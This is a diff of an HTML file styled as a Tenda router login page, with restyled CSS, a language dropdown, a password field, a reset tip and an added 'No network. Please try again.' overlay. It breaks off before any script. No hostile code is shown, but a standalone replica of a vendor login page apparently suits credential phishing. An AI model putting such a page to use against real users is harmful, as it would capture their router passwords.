@@ -5,33 +5,60 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Tenda | Login</title>
 <style>
-  :root {
-    --orange: #ED7020;
-    --border-gray: #E2E4E8;
-    --placeholder-gray: #A7ACB4;
-    --icon-gray: #58595C;
-    --text-dark: #26282B;
-    --link-gray: #A7ACB4;
+  /* ===== RESET & BASE ===== */
+  * {
+    -webkit-box-sizing: border-box;
+    -moz-box-sizing: border-box;
+    box-sizing: border-box;
   }
 
-  * { box-sizing: border-box; }
-
-  html, body { margin: 0; height: 100%; }
+  html {
+    font-size: 10px;
+    -webkit-tap-highlight-color: transparent;
+  }
 
   body {
-    font-family: Roboto, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
-    background: #FFFFFF;
+    font-family: Arial, "Microsoft Yahei", "Hiragino Sans GB", sans-serif;
+    font-size: 14px;
+    line-height: 1.42857;
+    color: #333;
+    background-color: #fff;
+    margin: 0;
     display: flex;
     justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+  }
+
+  input, button, select, textarea {
+    font-family: inherit;
+    font-size: inherit;
+    line-height: inherit;
+  }
+
+  /* ===== LOGIN CONTAINER ===== */
+  .login {
+    margin-top: 100px;
+    padding: 56px;
+    width: 100%;
+    max-width: 480px;
+  }
+
+  @media (max-width: 767px) {
+    .login {
+      margin-top: 15px;
+      padding: 16px;
+    }
   }
 
   .page {
     width: 100%;
     max-width: 360px;
-    padding: 28px 27px 24px;
+    margin: 0 auto;
     position: relative;
   }
 
+  /* ===== LOGO ===== */
   .logo-wrap {
     display: flex;
     justify-content: center;
@@ -42,8 +69,17 @@
     width: 116px;
     height: auto;
     display: block;
+    margin: 0 auto 30px;
   }
 
+  @media (min-width: 768px) {
+    .logo-wrap img {
+      width: 60%;
+      max-width: 60%;
+    }
+  }
+
+  /* ===== FIELDS ===== */
   .fields {
     position: relative;
   }
@@ -51,24 +87,31 @@
   .field {
     display: flex;
     align-items: center;
-    border: 1px solid var(--border-gray);
+    border: 1px solid #E2E4E8;
     border-radius: 8px;
     padding: 0 13px;
     height: 34px;
     gap: 10px;
     background: #fff;
+    width: 100%;
   }
 
-  .field + .field { margin-top: 17px; }
+  .field + .field {
+    margin-top: 17px;
+  }
 
-  .field .icon { flex-shrink: 0; display: flex; }
+  .field .icon {
+    flex-shrink: 0;
+    display: flex;
+    align-items: center;
+  }
 
   .field select,
   .field input {
     border: none;
     outline: none;
     font-size: 14.5px;
-    color: var(--text-dark);
+    color: #26282B;
     width: 100%;
     height: 100%;
     background: transparent;
@@ -78,16 +121,17 @@
     padding: 0;
   }
 
-  .field select { 
-    cursor: pointer; 
-    color: var(--text-dark) !important; 
-    display: none; /* Hide native select */
+  .field select {
+    cursor: pointer;
+    color: #26282B !important;
+    display: none;
   }
-  
-  .field input::placeholder { color: var(--placeholder-gray); }
-  .field .chevron { flex-shrink: 0; color: #9DA2A9; }
 
-  /* Custom Dropdown */
+  .field input::placeholder {
+    color: #A7ACB4;
+  }
+
+  /* ===== CUSTOM DROPDOWN ===== */
   .custom-select {
     position: relative;
     width: 100%;
@@ -100,11 +144,12 @@
     justify-content: space-between;
     cursor: pointer;
     height: 100%;
-    color: var(--text-dark);
+    color: #26282B;
     font-size: 14.5px;
     font-family: inherit;
     padding: 0;
     gap: 8px;
+    width: 100%;
   }
 
   .custom-select .selected .arrow-down {
@@ -122,9 +167,9 @@
     left: -13px;
     right: -13px;
     background: #fff;
-    border: 1px solid var(--border-gray);
+    border: 1px solid #E2E4E8;
     border-radius: 8px;
-    box-shadow: var(--dropdown-shadow);
+    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
     margin: 0;
     padding: 8px 0;
     list-style: none;
@@ -132,6 +177,7 @@
     display: none;
     max-height: 200px;
     overflow-y: auto;
+    min-width: 100%;
   }
 
   .dropdown-menu.show {
@@ -149,7 +195,7 @@
   }
 
   .dropdown-menu li a {
-    color: var(--text-dark);
+    color: #26282B;
     text-decoration: none;
     font-size: 14px;
     font-family: inherit;
@@ -161,6 +207,7 @@
     font-weight: 500;
   }
 
+  /* ===== EYE TOGGLE ===== */
   .eye-toggle {
     flex-shrink: 0;
     cursor: pointer;
@@ -170,11 +217,12 @@
     margin: -4px;
   }
 
+  /* ===== LOGIN BUTTON ===== */
   .login-btn {
     display: block;
     width: 100%;
     height: 36px;
-    background: var(--orange);
+    background: #ED7020;
     border: none;
     border-radius: 8px;
     color: #fff;
@@ -183,10 +231,42 @@
     margin-top: 54px;
     cursor: pointer;
     font-family: inherit;
+    transition: background 0.2s ease;
+    position: relative;
   }
 
-  .login-btn:active { background: #D9640F; }
+  .login-btn:hover {
+    background: #D9640F;
+  }
 
+  .login-btn:active {
+    background: #C85A0D;
+  }
+
+  .login-btn:disabled {
+    opacity: 0.7;
+    cursor: not-allowed;
+  }
+
+  /* ===== SPINNER ===== */
+  .spinner {
+    display: inline-block;
+    width: 16px;
+    height: 16px;
+    border: 2px solid rgba(255,255,255,0.3);
+    border-top: 2px solid #fff;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    vertical-align: middle;
+    margin-right: 8px;
+  }
+
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+
+  /* ===== FORGOT PASSWORD ===== */
   .forgot-row {
     display: flex;
     align-items: center;
@@ -199,7 +279,7 @@
     display: flex;
     align-items: center;
     gap: 5px;
-    color: var(--link-gray);
+    color: #999;
     font-size: 13px;
     background: none;
     border: none;
@@ -213,9 +293,11 @@
     transition: transform 0.15s ease;
   }
 
-  .forgot-btn.open .arrow { transform: rotate(90deg); }
+  .forgot-btn.open .arrow {
+    transform: rotate(90deg);
+  }
 
-  /* Inline modal / tooltip, matches Tenda's own overlay behavior */
+  /* ===== RESET TIP ===== */
   .reset-tip {
     position: absolute;
     left: 0;
@@ -229,9 +311,14 @@
     line-height: 1.55;
     display: none;
     z-index: 5;
+    opacity: 0.9;
+    filter: alpha(opacity=90);
   }
 
-  .reset-tip.show { display: block; }
+  .reset-tip.show {
+    display: block;
+    animation: fly-in 0.3s ease;
+  }
 
   .reset-tip .close-x {
     position: absolute;
@@ -244,9 +331,117 @@
     padding: 4px;
   }
 
+  /* ===== HH TIP ===== */
+  .hh-tip {
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    background: rgba(20, 20, 20, 0.9);
+    color: #fff;
+    border-radius: 8px;
+    padding: 14px 15px;
+    font-size: 13.5px;
+    line-height: 1.55;
+    display: none;
+    z-index: 6;
+    opacity: 0.9;
+    filter: alpha(opacity=90);
+  }
+
+  .hh-tip.show {
+    display: block;
+    animation: fly-in 0.3s ease;
+  }
+
+  /* ===== ANIMATIONS ===== */
+  .fly-in {
+    -webkit-animation: fly-in 0.8s ease;
+    -moz-animation: fly-in 0.8s ease;
+    -o-animation: fly-in 0.8s ease;
+    animation: fly-in 0.8s ease;
+  }
+
+  @-webkit-keyframes fly-in {
+    0% { transform: translateY(-100%); opacity: 0; }
+    100% { transform: translateY(0%); opacity: 1; }
+  }
+
+  @-moz-keyframes fly-in {
+    0% { transform: translateY(-100%); opacity: 0; }
+    100% { transform: translateY(0%); opacity: 1; }
+  }
+
+  @keyframes fly-in {
+    0% { transform: translateY(-100%); opacity: 0; }
+    100% { transform: translateY(0%); opacity: 1; }
+  }
+
+  .shake {
+    -webkit-animation: shake 0.2s ease 2;
+    -moz-animation: shake 0.2s ease 2;
+    -o-animation: shake 0.2s ease 2;
+    animation: shake 0.2s ease 2;
+  }
+
+  @-webkit-keyframes shake {
+    0% { transform: translateX(0); }
+    25% { transform: translateX(-10%); }
+    50% { transform: translateX(0); }
+    75% { transform: translateX(10%); }
+    100% { transform: translateX(0); }
+  }
+
+  @-moz-keyframes shake {
+    0% { transform: translateX(0); }
+    25% { transform: translateX(-10%); }
+    50% { transform: translateX(0); }
+    75% { transform: translateX(10%); }
+    100% { transform: translateX(0); }
+  }
+
+  @keyframes shake {
+    0% { transform: translateX(0); }
+    25% { transform: translateX(-5%); }
+    50% { transform: translateX(0); }
+    75% { transform: translateX(5%); }
+    100% { transform: translateX(0); }
+  }
+
+  /* ===== RESPONSIVE ===== */
+  @media (max-width: 767px) {
+    .reset-tip {
+      position: absolute;
+      top: 25%;
+      left: 10px;
+      right: 10px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      padding: 20px;
+      background-color: #000;
+      color: #fff;
+      opacity: .9;
+      filter: alpha(opacity=90);
+    }
+
+    .hh-tip {
+      position: absolute;
+      top: 25%;
+      left: 10px;
+      right: 10px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      padding: 20px;
+      background-color: #000;
+      color: #fff;
+      opacity: .9;
+      filter: alpha(opacity=90);
+    }
+  }
+
   @media (max-width: 340px) {
     .page { padding: 24px 20px 20px; }
-     .dropdown-menu {
+    .dropdown-menu {
       left: -10px;
       right: -10px;
     }
@@ -254,378 +449,298 @@
 </style>
 </head>
 <body>
-  <div class="page">
 
-    <div class="logo-wrap">
-      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIUAAAAeCAYAAAACe928AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyFpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNS1jMDE0IDc5LjE1MTQ4MSwgMjAxMy8wMy8xMy0xMjowOToxNSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NEUwNDVDRkExQTE4MTFFNThCOEFGMTlBNzFDOUNBNzUiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NEUwNDVDRjkxQTE4MTFFNThCOEFGMTlBNzFDOUNBNzUiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIChXaW5kb3dzKSI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOkFGQjMzN0U0ODEwQzExRTQ4MUU3RDZCNTFENjJEMDdBIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOkFGQjMzN0U1ODEwQzExRTQ4MUU3RDZCNTFENjJEMDdBIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+nrUeuQAAB3dJREFUaN7tW310z1UY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" alt="Tenda">
-    </div>
+  <div class="login fly-in">
+    <div class="page">
 
-    <div class="fields" id="fieldsWrap">
-
-      <div class="reset-tip" id="resetTip">
-        <span class="close-x" id="closeTip" title="Close">&times;</span>
-        &gt; First, push the reset button for about 8 seconds and then release it to reset your router.<br>
-        Second, set a new login password.
+      <!-- LOGO -->
+      <div class="logo-wrap">
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIUAAAAeCAYAAAACe928AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyFpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNS1jMDE0IDc5LjE1MTQ4MSwgMjAxMy8wMy8xMy0xMjowOToxNSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NEUwNDVDRkExQTE4MTFFNThCOEFGMTlBNzFDOUNBNzUiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NEUwNDVDRjkxQTE4MTFFNThCOEFGMTlBNzFDOUNBNzUiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIChXaW5kb3dzKSI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOkFGQjMzN0U0ODEwQzExRTQ4MUU3RDZCNTFENjJEMDdBIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOkFGQjMzN0U1ODEwQzExRTQ4MUU3RDZCNTFENjJEMDdBIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+nrUeuQAAB3dJREFUaN7tW310z1UY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" alt="Tenda">
       </div>
-         <div class="reset-tip hh-tip" id="hhhTip">
-        &gt; No network.<br>
-        Please try again.
-      </div>
-       <div class="field">
-        <span class="icon">
-          <svg width="17" height="17" viewBox="0 0 24 24" fill="none">
-            <circle cx="12" cy="12" r="9" stroke="#58595C" stroke-width="1.7"/>
-            <ellipse cx="12" cy="12" rx="4" ry="9" stroke="#58595C" stroke-width="1.7"/>
-            <line x1="3" y1="12" x2="21" y2="12" stroke="#58595C" stroke-width="1.7"/>
-          </svg>
-        </span>
-        <!-- Hidden native select for form compatibility -->
-        <select id="languageSelect">
-          <option value="en">English</option>
-          <option value="zh">繁體中文</option>
-          <option value="ko">한국</option>
-          <option value="de">Deutsch</option>
-          <option value="es">Español</option>
-          <option value="fr">Français</option>
-          <option value="hu">Magyar</option>
-          <option value="it">Italiano</option>
-          <option value="pl">Polski</option>
-          <option value="pt">Português</option>
-          <option value="ro">Română</option>
-          <option value="tr">Türkçe</option>
-        </select>
-        <!-- Custom dropdown -->
-        <div class="custom-select" id="customSelect">
-          <div class="selected" id="selectedDisplay">
-            <span id="selectedText">English</span>
-            <span class="arrow-down" id="arrowDown">
-              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
-                <polyline points="6 9 12 15 18 9"/>
-              </svg>
-            </span>
-          </div>
-          <ul class="dropdown-menu" id="dropdownMenu">
-            <li data-val="en" class="active"><a>English</a></li>
-            <li data-val="zh"><a>繁體中文</a></li>
-            <li data-val="ko"><a>한국</a></li>
-            <li data-val="de"><a>Deutsch</a></li>
-            <li data-val="es"><a>Español</a></li>
-            <li data-val="fr"><a>Français</a></li>
-            <li data-val="hu"><a>Magyar</a></li>
-            <li data-val="it"><a>Italiano</a></li>
-            <li data-val="pl"><a>Polski</a></li>
-            <li data-val="pt"><a>Português</a></li>
-            <li data-val="ro"><a>Română</a></li>
-            <li data-val="tr"><a>Türkçe</a></li>
-          </ul>
+
+      <!-- FIELDS -->
+      <div class="fields" id="fieldsWrap">
+
+        <!-- Reset Tip -->
+        <div class="reset-tip" id="resetTip">
+          <span class="close-x" id="closeTip" title="Close">&times;</span>
+          &gt; First, push the reset button for about 8 seconds and then release it to reset your router.<br>
+          Second, set a new login password.
         </div>
+
+        <!-- HH Tip -->
+        <div class="hh-tip" id="hhhTip">
+          &gt; No network.<br>
+          Please try again.
+        </div>
+
+        <!-- Language Field -->
+        <div class="field">
+          <span class="icon">
+            <svg width="17" height="17" viewBox="0 0 24 24" fill="none">
+              <circle cx="12" cy="12" r="9" stroke="#58595C" stroke-width="1.7"/>
+              <ellipse cx="12" cy="12" rx="4" ry="9" stroke="#58595C" stroke-width="1.7"/>
+              <line x1="3" y1="12" x2="21" y2="12" stroke="#58595C" stroke-width="1.7"/>
+            </svg>
+          </span>
+
+          <select id="languageSelect">
+            <option value="en">English</option>
+            <option value="zh">繁體中文</option>
+            <option value="ko">한국</option>
+            <option value="de">Deutsch</option>
+            <option value="es">Español</option>
+            <option value="fr">Français</option>
+            <option value="hu">Magyar</option>
+            <option value="it">Italiano</option>
+            <option value="pl">Polski</option>
+            <option value="pt">Português</option>
+            <option value="ro">Română</option>
+            <option value="tr">Türkçe</option>
+          </select>
+
+          <div class="custom-select" id="customSelect">
+            <div class="selected" id="selectedDisplay">
+              <span id="selectedText">English</span>
+              <span class="arrow-down" id="arrowDown">
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
+                  <polyline points="6 9 12 15 18 9"/>
+                </svg>
+              </span>
+            </div>
+            <ul class="dropdown-menu" id="dropdownMenu">
+              <li data-val="en" class="active"><a>English</a></li>
+              <li data-val="zh"><a>繁體中文</a></li>
+              <li data-val="ko"><a>한국</a></li>
+              <li data-val="de"><a>Deutsch</a></li>
+              <li data-val="es"><a>Español</a></li>
+              <li data-val="fr"><a>Français</a></li>
+              <li data-val="hu"><a>Magyar</a></li>
+              <li data-val="it"><a>Italiano</a></li>
+              <li data-val="pl"><a>Polski</a></li>
+              <li data-val="pt"><a>Português</a></li>
+              <li data-val="ro"><a>Română</a></li>
+              <li data-val="tr"><a>Türkçe</a></li>
+            </ul>
+          </div>
+        </div>
+
+        <!-- Password Field -->
+        <div class="field">
+          <span class="icon">
+            <svg width="15" height="17" viewBox="0 0 24 26" fill="#58595C">
+              <path d="M12 0a6.5 6.5 0 00-6.5 6.5V10H4a2 2 0 00-2 2v11a2 2 0 002 2h16a2 2 0 002-2V12a2 2 0 00-2-2h-1.5V6.5A6.5 6.5 0 0012 0zm0 2.2a4.3 4.3 0 014.3 4.3V10H7.7V6.5A4.3 4.3 0 0112 2.2z"/>
+            </svg>
+          </span>
+          <input id="password" type="password" placeholder="Login Password" required>
+          <span class="eye-toggle" onclick="togglePassword()">
+            <svg id="eye-icon" width="19" height="13" viewBox="0 0 24 16" fill="none">
+              <path d="M1 8c2.7-4.5 6.8-7 11-7s8.3 2.5 11 7" stroke="#C7CBD1" stroke-width="1.6" stroke-linecap="round"/>
+              <path d="M4 8c1.2 1 2.6 1.8 4 2.3M20 8c-1.2 1-2.6 1.8-4 2.3" stroke="#C7CBD1" stroke-width="1.6" stroke-linecap="round"/>
+            </svg>
+          </span>
+        </div>
+
       </div>
 
-      <div class="field">
-        <span class="icon">
-          <svg width="15" height="17" viewBox="0 0 24 26" fill="#58595C">
-            <path d="M12 0a6.5 6.5 0 00-6.5 6.5V10H4a2 2 0 00-2 2v11a2 2 0 002 2h16a2 2 0 002-2V12a2 2 0 00-2-2h-1.5V6.5A6.5 6.5 0 0012 0zm0 2.2a4.3 4.3 0 014.3 4.3V10H7.7V6.5A4.3 4.3 0 0112 2.2z"/>
-          </svg>
-        </span>
-        <input id="password" type="password" placeholder="Login Password" required>
-        <span class="eye-toggle" onclick="togglePassword()">
-          <svg id="eye-icon" width="19" height="13" viewBox="0 0 24 16" fill="none">
